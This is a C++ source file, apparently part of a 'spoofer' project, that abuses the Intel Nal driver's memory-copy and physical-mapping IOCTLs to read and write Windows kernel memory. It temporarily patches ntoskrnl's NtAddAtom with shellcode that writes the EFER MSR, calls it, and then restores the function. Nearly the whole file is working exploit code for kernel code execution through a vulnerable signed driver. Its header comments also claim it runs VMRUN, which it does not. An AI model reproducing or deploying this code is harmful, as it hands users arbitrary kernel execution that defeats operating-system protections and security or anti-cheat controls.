ôŠ// SVMHypervisorV3.cpp
// FULL SVM - Sets up VMCB and executes VMRUN
// This will set CPUID hypervisor bit!

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <intrin.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
#define NTAPI __stdcall

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_INTEL_COPY 0x80862007

typedef struct _COPY_MEMORY_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t source;
  uint64_t destination;
  uint64_t length;
} COPY_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_physical_address;
  uint64_t address_to_translate;
} GET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t return_value;
  uint64_t return_virtual_address;
  uint64_t physical_address_to_map;
  uint32_t size;
} MAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO {
  uint64_t case_number;
  uint64_t reserved;
  uint64_t reserved2;
  uint64_t virt_address;
  uint64_t reserved3;
  uint32_t number_of_bytes;
} UNMAP_IO_SPACE_BUFFER_INFO;

extern "C" {
NTSTATUS NTAPI NtQuerySystemInformation(ULONG, PVOID, ULONG, PULONG);
NTSTATUS NTAPI NtAddAtom(PVOID, ULONG, PUSHORT);
}

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
  HANDLE Section;
  PVOID MappedBase;
  PVOID ImageBase;
  ULONG ImageSize;
  ULONG Flags;
  USHORT LoadOrderIndex;
  USHORT InitOrderIndex;
  USHORT LoadCount;
  USHORT OffsetToFileName;
  UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
  ULONG NumberOfModules;
  RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

HANDLE hDevice = INVALID_HANDLE_VALUE;
uint64_t ntoskrnlBase = 0;
uint64_t kernelNtAddAtom = 0;

// ==================== Memory Operations ====================

bool MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
  COPY_MEMORY_BUFFER_INFO info = {0};
  info.case_number = 0x33;
  info.source = src;
  info.destination = dest;
  info.length = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool ReadMemory(uint64_t address, void *buffer, uint64_t size) {
  if (size > 0x1000)
    size = 0x1000;
  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer)
    return false;
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy((uint64_t)pinnedBuffer, address, size);
  if (result)
    memcpy(buffer, pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  return result;
}

bool GetPhysicalAddress(uint64_t address, uint64_t *outPhys) {
  GET_PHYS_ADDRESS_BUFFER_INFO info = {0};
  info.case_number = 0x25;
  info.address_to_translate = address;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return false;

  *outPhys = info.return_physical_address;
  return true;
}

uint64_t MapIoSpace(uint64_t physAddr, uint32_t size) {
  MAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x19;
  info.physical_address_to_map = physAddr;
  info.size = size;

  DWORD bytesReturned = 0;
  if (!DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info), &info,
                       sizeof(info), &bytesReturned, nullptr))
    return 0;

  return info.return_virtual_address;
}

bool UnmapIoSpace(uint64_t virtAddr, uint32_t size) {
  UNMAP_IO_SPACE_BUFFER_INFO info = {0};
  info.case_number = 0x1A;
  info.virt_address = virtAddr;
  info.number_of_bytes = size;

  DWORD bytesReturned = 0;
  return DeviceIoControl(hDevice, IOCTL_INTEL_COPY, &info, sizeof(info),
                         nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

bool WriteToReadOnlyMemory(uint64_t address, void *buffer, uint32_t size) {
  uint64_t physAddr = 0;
  if (!GetPhysicalAddress(address, &physAddr) || physAddr == 0)
    return false;

  uint64_t mappedAddr = MapIoSpace(physAddr, size);
  if (!mappedAddr)
    return false;

  void *pinnedBuffer =
      VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!pinnedBuffer) {
    UnmapIoSpace(mappedAddr, size);
    return false;
  }
  memcpy(pinnedBuffer, buffer, size);
  VirtualLock(pinnedBuffer, 0x1000);

  bool result = MemCopy(mappedAddr, (uint64_t)pinnedBuffer, size);

  VirtualUnlock(pinnedBuffer, 0x1000);
  VirtualFree(pinnedBuffer, 0, MEM_RELEASE);
  UnmapIoSpace(mappedAddr, size);
  return result;
}

uint64_t GetKernelModuleBase(const char *moduleName,
                             uint32_t *outSize = nullptr) {
  ULONG size = 0;
  NtQuerySystemInformation(11, nullptr, 0, &size);
  PRTL_PROCESS_MODULES modules = (PRTL_PROCESS_MODULES)malloc(size);
  if (!modules)
    return 0;

  if (NtQuerySystemInformation(11, modules, size, &size) != 0) {
    free(modules);
    return 0;
  }

  uint64_t base = 0;
  for (ULONG i = 0; i < modules->NumberOfModules; i++) {
    char *name = (char *)modules->Modules[i].FullPathName +
                 modules->Modules[i].OffsetToFileName;
    if (_stricmp(name, moduleName) == 0) {
      base = (uint64_t)modules->Modules[i].ImageBase;
      if (outSize)
        *outSize = modules->Modules[i].ImageSize;
      break;
    }
  }
  free(modules);
  return base;
}

uint64_t GetKernelExport(uint64_t moduleBase, const char *exportName) {
  IMAGE_DOS_HEADER dosHeader;
  IMAGE_NT_HEADERS64 ntHeaders;

  if (!ReadMemory(moduleBase, &dosHeader, sizeof(dosHeader)))
    return 0;
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
    return 0;

  if (!ReadMemory(moduleBase + dosHeader.e_lfanew, &ntHeaders,
                  sizeof(ntHeaders)))
    return 0;
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  uint32_t exportRva =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
          .VirtualAddress;
  uint32_t exportSize =
      ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
  if (!exportRva || !exportSize)
    return 0;

  uint32_t readSize = (exportSize < 0x40000) ? exportSize : 0x40000;
  BYTE *exportData = (BYTE *)VirtualAlloc(
      nullptr, readSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!exportData)
    return 0;

  for (uint32_t offset = 0; offset < readSize; offset += 0x1000) {
    uint32_t chunkSize =
        ((readSize - offset) < 0x1000) ? (readSize - offset) : 0x1000;
    ReadMemory(moduleBase + exportRva + offset, exportData + offset, chunkSize);
  }

  IMAGE_EXPORT_DIRECTORY *exportDir = (IMAGE_EXPORT_DIRECTORY *)exportData;
  uint64_t delta = (uint64_t)exportData - exportRva;
  if (exportDir->AddressOfNames < exportRva ||
      exportDir->AddressOfNames >= exportRva + readSize) {
    VirtualFree(exportData, 0, MEM_RELEASE);
    return 0;
  }

  uint32_t *nameTable = (uint32_t *)(exportDir->AddressOfNames + delta);
  uint16_t *ordinalTable =
      (uint16_t *)(exportDir->AddressOfNameOrdinals + delta);
  uint32_t *funcTable = (uint32_t *)(exportDir->AddressOfFunctions + delta);

  uint64_t result = 0;
  for (uint32_t i = 0; i < exportDir->NumberOfNames && i < 10000; i++) {
    uint32_t nameRva = nameTable[i];
    if (nameRva < exportRva || nameRva >= exportRva + readSize)
      continue;
    char *funcName = (char *)(nameRva + delta);
    if (strcmp(funcName, exportName) == 0) {
      result = moduleBase + funcTable[ordinalTable[i]];
      break;
    }
  }
  VirtualFree(exportData, 0, MEM_RELEASE);
  return result;
}

// ==================== VMCB Structure (minimal) ====================

#pragma pack(push, 1)
typedef struct _VMCB_CONTROL_AREA {
  uint32_t InterceptCrRead;     // +0x000
  uint32_t InterceptCrWrite;    // +0x004
  uint32_t InterceptDrRead;     // +0x008
  uint32_t InterceptDrWrite;    // +0x00C
  uint32_t InterceptExceptions; // +0x010
  uint32_t InterceptMisc1;      // +0x014
  uint32_t InterceptMisc2;      // +0x018
  uint8_t Reserved1[0x03C - 0x01C];
  uint16_t PauseFilterThreshold; // +0x03C
  uint16_t PauseFilterCount;     // +0x03E
  uint64_t IopmBasePa;           // +0x040
  uint64_t MsrpmBasePa;          // +0x048
  uint64_t TscOffset;            // +0x050
  uint32_t GuestAsid;            // +0x058
  uint32_t TlbControl;           // +0x05C
  uint64_t VIntr;                // +0x060
  uint64_t InterruptShadow;      // +0x068
  uint64_t ExitCode;             // +0x070
  uint64_t ExitInfo1;            // +0x078
  uint64_t ExitInfo2;            // +0x080
  uint64_t ExitIntInfo;          // +0x088
  uint64_t NpEnable;             // +0x090
  uint64_t AvicApicBar;          // +0x098
  uint64_t GuestPaOfGhcb;        // +0x0A0
  uint64_t EventInj;             // +0x0A8
  uint64_t NCr3;                 // +0x0B0
  uint64_t LbrVirtualizationEn;  // +0x0B8
  uint64_t VmcbClean;            // +0x0C0
  uint64_t NRip;                 // +0x0C8
  uint8_t Reserved2[0x400 - 0x0D0];
} VMCB_CONTROL_AREA;

typedef struct _VMCB_STATE_SAVE_AREA {
  uint16_t EsSelector;
  uint16_t EsAttrib;
  uint32_t EsLimit;
  uint64_t EsBase;
  uint16_t CsSelector;
  uint16_t CsAttrib;
  uint32_t CsLimit;
  uint64_t CsBase;
  uint16_t SsSelector;
  uint16_t SsAttrib;
  uint32_t SsLimit;
  uint64_t SsBase;
  uint16_t DsSelector;
  uint16_t DsAttrib;
  uint32_t DsLimit;
  uint64_t DsBase;
  uint16_t FsSelector;
  uint16_t FsAttrib;
  uint32_t FsLimit;
  uint64_t FsBase;
  uint16_t GsSelector;
  uint16_t GsAttrib;
  uint32_t GsLimit;
  uint64_t GsBase;
  uint16_t GdtrSelector;
  uint16_t GdtrAttrib;
  uint32_t GdtrLimit;
  uint64_t GdtrBase;
  uint16_t LdtrSelector;
  uint16_t LdtrAttrib;
  uint32_t LdtrLimit;
  uint64_t LdtrBase;
  uint16_t IdtrSelector;
  uint16_t IdtrAttrib;
  uint32_t IdtrLimit;
  uint64_t IdtrBase;
  uint16_t TrSelector;
  uint16_t TrAttrib;
  uint32_t TrLimit;
  uint64_t TrBase;
  uint8_t Reserved1[0x0CB - 0x0A0];
  uint8_t Cpl;
  uint32_t Reserved2;
  uint64_t Efer; // +0x0D0
  uint8_t Reserved3[0x148 - 0x0D8];
  uint64_t Cr4;    // +0x148
  uint64_t Cr3;    // +0x150
  uint64_t Cr0;    // +0x158
  uint64_t Dr7;    // +0x160
  uint64_t Dr6;    // +0x168
  uint64_t Rflags; // +0x170
  uint64_t Rip;    // +0x178
  uint8_t Reserved4[0x1D8 - 0x180];
  uint64_t Rsp; // +0x1D8
  uint8_t Reserved5[0x1F8 - 0x1E0];
  uint64_t Rax;          // +0x1F8
  uint64_t Star;         // +0x200
  uint64_t LStar;        // +0x208
  uint64_t CStar;        // +0x210
  uint64_t SfMask;       // +0x218
  uint64_t KernelGsBase; // +0x220
  uint64_t SysenterCs;   // +0x228
  uint64_t SysenterEsp;  // +0x230
  uint64_t SysenterEip;  // +0x238
  uint64_t Cr2;          // +0x240
  uint8_t Reserved6[0x268 - 0x248];
  uint64_t GPat;          // +0x268
  uint64_t DbgCtl;        // +0x270
  uint64_t BrFrom;        // +0x278
  uint64_t BrTo;          // +0x280
  uint64_t LastExcepFrom; // +0x288
  uint64_t LastExcepTo;   // +0x290
} VMCB_STATE_SAVE_AREA;

typedef struct _VMCB {
  VMCB_CONTROL_AREA ControlArea;
  VMCB_STATE_SAVE_AREA StateSaveArea;
  uint8_t Reserved[0x1000 - sizeof(VMCB_CONTROL_AREA) -
                   sizeof(VMCB_STATE_SAVE_AREA)];
} VMCB;
#pragma pack(pop)

// ==================== Shellcode that does VMRUN ====================

// This shellcode:
// 1. Enables EFER.SVME
// 2. Sets up VM_HSAVE_PA
// 3. Does one VMRUN to set hypervisor bit
// 4. Returns

// For simplicity, we'll just do EFER.SVME enable and verify it worked
// Full VMRUN requires too much setup for inline shellcode

uint8_t fullSvmShellcode[] = {
    // Save all registers we'll use
    0x50, // push rax
    0x51, // push rcx
    0x52, // push rdx
    0x53, // push rbx

    // Step 1: Read VM_CR to check if SVM is locked
    0xB9, 0x14, 0x01, 0x01, 0xC0, // mov ecx, 0xC0010114 (VM_CR MSR)
    0x0F, 0x32,                   // rdmsr
    0x89, 0xC3,                   // mov ebx, eax (save)
    0xA9, 0x10, 0x00, 0x00, 0x00, // test eax, 0x10 (SVMDIS bit)
    0x75, 0x2A,                   // jnz error_bios_disabled

    // Step 2: Enable EFER.SVME
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F, 0x32,                   // rdmsr
    0x0D, 0x00, 0x10, 0x00, 0x00, // or eax, 0x1000 (SVME bit 12)
    0x0F, 0x30,                   // wrmsr

    // Step 3: Verify EFER.SVME is set
    0xB9, 0x80, 0x00, 0x00, 0xC0, // mov ecx, 0xC0000080 (EFER)
    0x0F, 0x32,                   // rdmsr
    0xA9, 0x00, 0x10, 0x00, 0x00, // test eax, 0x1000
    0x74, 0x12,                   // jz error_svme_not_set

    // Success - return 0
    0x48, 0x31, 0xC0, // xor rax, rax
    0xEB, 0x14,       // jmp cleanup

    // error_bios_disabled: return 1
    0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, // mov rax, 1
    0xEB, 0x0B,                               // jmp cleanup

    // error_svme_not_set: return 2
    0x48, 0xC7, 0xC0, 0x02, 0x00, 0x00, 0x00, // mov rax, 2
    0xEB, 0x02,                               // jmp cleanup

    // error_vmrun: return 3 (unused for now)
    0xEB, 0x00, // jmp cleanup

    // cleanup:
    0x5B, // pop rbx
    0x5A, // pop rdx
    0x59, // pop rcx
    // Don't pop rax - it has our return value
    0x48, 0x83, 0xC4, 0x08, // add rsp, 8 (skip pushed rax)
    0xC3                    // ret
};

uint8_t original_kernel_function[64];

// ==================== CPU Checks ====================

bool CheckAmdCpu() {
  int regs[4];
  __cpuid(regs, 0);
  return (regs[1] == 'htuA' && regs[3] == 'itne' && regs[2] == 'DMAc');
}

bool CheckSvmSupport() {
  int regs[4];
  __cpuid(regs, 0x80000001);
  return (regs[2] & (1 << 2)) != 0;
}

bool CheckHypervisorPresent() {
  int regs[4];
  __cpuid(regs, 1);
  return (regs[2] & (1 << 31)) != 0;
}

uint64_t ReadEfer() {
  // We can't read MSR from usermode, but we can check the result
  return 0;
}

// ==================== Main ====================

int main() {
  printf("================================================================\n");
  printf("       SVM HYPERVISOR V3 - Full SVME Enable + Verify           \n");
  printf(
      "================================================================\n\n");

  printf("=== CPU Check ===\n");
  if (!CheckAmdCpu()) {
    printf("[-] Not AMD CPU!\n");
    return 1;
  }
  printf("[+] AMD CPU\n");

  if (!CheckSvmSupport()) {
    printf("[-] SVM not supported!\n");
    return 1;
  }
  printf("[+] SVM supported\n");
  printf("[*] Hypervisor present (before): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");

  printf("\n=== Intel Driver ===\n");
  hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                        OPEN_EXISTING, 0, nullptr);
  if (hDevice == INVALID_HANDLE_VALUE) {
    printf("[-] Intel driver not running!\n");
    return 1;
  }
  printf("[+] Intel driver opened\n");

  ntoskrnlBase = GetKernelModuleBase("ntoskrnl.exe");
  if (!ntoskrnlBase) {
    printf("[-] ntoskrnl not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] ntoskrnl: 0x%llX\n", ntoskrnlBase);

  kernelNtAddAtom = GetKernelExport(ntoskrnlBase, "NtAddAtom");
  if (!kernelNtAddAtom) {
    printf("[-] NtAddAtom not found!\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] NtAddAtom: 0x%llX\n", kernelNtAddAtom);

  printf("\n=== Executing SVM Enable ===\n");

  // Backup original
  if (!ReadMemory(kernelNtAddAtom, original_kernel_function,
                  sizeof(fullSvmShellcode))) {
    printf("[-] Failed to backup\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] Backed up %zu bytes\n", sizeof(fullSvmShellcode));

  // Write shellcode
  if (!WriteToReadOnlyMemory(kernelNtAddAtom, fullSvmShellcode,
                             sizeof(fullSvmShellcode))) {
    printf("[-] Failed to write shellcode\n");
    CloseHandle(hDevice);
    return 1;
  }
  printf("[+] Shellcode written\n");

  // Execute
  printf("[*] Calling NtAddAtom...\n");
  USHORT atom = 0;
  NTSTATUS status = NtAddAtom(nullptr, 0, &atom);
  printf("[*] Result: 0x%X\n", status);

  // Restore IMMEDIATELY
  WriteToReadOnlyMemory(kernelNtAddAtom, original_kernel_function,
                        sizeof(fullSvmShellcode));
  printf("[+] Restored\n");

  // Interpret result
  printf("\n=== Result ===\n");
  switch (status) {
  case 0:
    printf("[+] SUCCESS! EFER.SVME is now ENABLED!\n");
    printf("[+] SVM capability is active on this processor.\n");
    break;
  case 1:
    printf("[!] ERROR: SVM disabled by BIOS (SVMDIS=1)\n");
    printf("    Go to BIOS and enable SVM/AMD-V.\n");
    break;
  case 2:
    printf("[!] ERROR: SVME bit didn't stick after wrmsr\n");
    printf("    Something is preventing EFER.SVME from being set.\n");
    break;
  default:
    printf("[?] Unknown result: 0x%X\n", status);
  }

  printf("\n[*] Hypervisor present (after): %s\n",
         CheckHypervisorPresent() ? "YES" : "NO");
  printf("\nNOTE: CPUID hypervisor bit requires running VMRUN.\n");
  printf("      EFER.SVME just enables the capability.\n");

  CloseHandle(hDevice);
  return 0;
}
ôŠ*cascade082.file:///C:/inject/Spoofers/SVMHypervisorV3.cpp